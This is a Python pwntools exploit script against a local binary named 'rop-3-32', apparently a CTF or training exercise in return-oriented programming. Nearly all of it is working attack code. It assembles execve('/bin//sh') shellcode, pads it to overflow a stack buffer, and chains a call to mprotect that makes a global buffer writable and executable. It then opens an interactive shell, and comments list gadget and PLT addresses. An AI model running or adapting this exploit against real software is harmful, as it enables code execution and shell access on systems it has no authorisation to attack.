#!/usr/bin/env python

from pwn import *
import os

p = process("./rop-3-32")

shell_code = 'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80'

buf = shell_code + "A" * (0x98 -len(shell_code)) + "BBBB"

'''
p = process("./rop-3-xx")
context.terminal = ["tmux", "splitw", "-h"]
gdb.attach(p)
'''


"""
0x08048360  mprotect@plt
0x08048370  read@plt
"""
read = p32(0x08048370)
mprotect = p32(0x08048360)

'''
 0x08048608 : pop ebp ; lea esp, [ecx - 4] ; ret
 0x080485aa : pop ebp ; ret
 0x08048607 : pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
 0x080485a7 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
 0x0804834d : pop ebx ; ret
 0x08048606 : pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
 0x080485a9 : pop edi ; pop ebp ; ret
 0x080485a8 : pop esi ; pop edi ; pop ebp ; ret
'''


#go into gdb and print &g_buf to get addr
#0  out last 4 digits to page align

pop_3_ret = p32(0x080485a8)
g_buf = p32(0x804a060)
g_buf_algined = p32(0x804a000)
#mprotect(0x804a800,0x1000,7)

buf += mprotect
#buf += 'AAAA'
#buf += pop_3_ret
buf += g_buf
buf += g_buf_algined
buf += p32(0x1000)
buf += p32(7)



p.sendline(buf)
p.interactive()